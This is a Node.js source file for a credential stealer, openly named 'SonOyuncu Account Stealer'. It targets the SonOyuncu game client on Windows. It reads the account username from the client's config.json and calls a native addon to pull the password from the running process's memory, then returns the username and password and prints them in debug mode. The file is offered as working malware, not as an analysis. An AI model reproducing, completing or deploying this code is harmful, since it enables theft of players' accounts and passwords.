const addon = require('./build/Release/addon');
const fs = require('fs');
const path = require('path');
const os = require('os');

/**
 * @author: Fatih1963
 * @version: 1.0
 * @date: 2025-06-23
 */

class SonOyuncuStealer {
    constructor(debug = false) {
        this.debug = debug;
        this.applicationPath = path.join(os.homedir(), 'AppData', 'Roaming', '.sonoyuncu', 'sonoyuncuclient.exe');
        this.configPath = path.join(os.homedir(), 'AppData', 'Roaming', '.sonoyuncu', 'config.json');
    }

    /**
     * Debug logging helper
     * @param {...any} args - Arguments to log
     */
    log(...args) {
        if (this.debug) {
            console.log(...args);
        }
    }

    /**
     * Error logging helper
     * @param {...any} args - Arguments to log
     */
    error(...args) {
        if (this.debug) {
            console.error(...args);
        }
    }

    /**
     * Check if the SonOyuncu application exists
     * @returns {boolean} True if application exists
     */
    checkApplicationExists() {
        try {
            return addon.checkApplicationExists(this.debug);
        } catch (error) {
            this.error('Error checking application existence:', error.message);
            return false;
        }
    }

    /**
     * Read username from config.json file
     * @returns {string|null} Username or null if not found
     */
    readUsername() {
        try {
            if (!fs.existsSync(this.configPath)) {
                this.error('Config file not found:', this.configPath);
                return null;
            }

            const configData = fs.readFileSync(this.configPath, 'utf8');
            const config = JSON.parse(configData);

            if (!config.userName) {
                this.error('Username not found in config file');
                return null;
            }

            return config.userName;
        } catch (error) {
            this.error('Error reading username from config:', error.message);
            return null;
        }
    }

    /**
     * Extract password from memory using native addon
     * @returns {string|null} Password or null if not found
     */
    extractPassword() {
        try {
            this.log('Starting password extraction from memory...');
            const password = addon.extractCredentials(this.debug);

            if (!password || password.length === 0) {
                this.error('No password extracted from memory');
                return null;
            }

            this.log(`Password extracted successfully: ${password.substring(0, 3)}... (${password.length} chars)`);
            return password;
        } catch (error) {
            this.error('Error extracting password:', error.message);
            this.error('Stack trace:', error.stack);
            return null;
        }
    }

    /**
     * Extract both username and password
     * @returns {Object|null} Credentials object or null if failed
     */
    extractCredentials() {
        if (!this.checkApplicationExists()) {
            this.error('SonOyuncu application not found at:', this.applicationPath);
            return null;
        }

        const username = this.readUsername();
        if (!username) {
            return null;
        }

        const password = this.extractPassword();
        if (!password) {
            return null;
        }

        return {
            username: username,
            password: password
        };
    }

    /**
     * Main execution method
     */
    run() {
        if (this.debug) {
            console.log('SonOyuncu Account Stealer v2.0');
            console.log('==============================');
        }

        if (!this.checkApplicationExists()) {
            this.error('SonOyuncu application not found at:', this.applicationPath);
            return null;
        }

        this.log('✓ Application found');

        const username = this.readUsername();
        if (!username) {
            this.error('✗ Failed to read username');
            return null;
        }

        this.log('✓ Username read:', username);

        this.log('Starting memory extraction process...');
        const password = this.extractPassword();

        if (password) {
            if (this.debug) {
                console.log('');
                console.log('=== EXTRACTION SUCCESSFUL ===');
                console.log(`Username: ${username}`);
                console.log(`Password: ${password}`);
                console.log(`Full: ${username}:${password}`);
                console.log('=============================');
            }
            return { username, password };
        } else {
            if (this.debug) {
                console.log('');
                console.log('=== EXTRACTION FAILED ===');
                console.log('Could not extract password from memory');
                console.log('This might be due to:');
                console.log('- Wrong memory offset');
                console.log('- Process protection');
                console.log('- Timing issues');
                console.log('========================');
            }
            return null;
        }
    }
}

module.exports = SonOyuncuStealer;

if (require.main === module) {
    const stealer = new SonOyuncuStealer(false);
    stealer.run();
}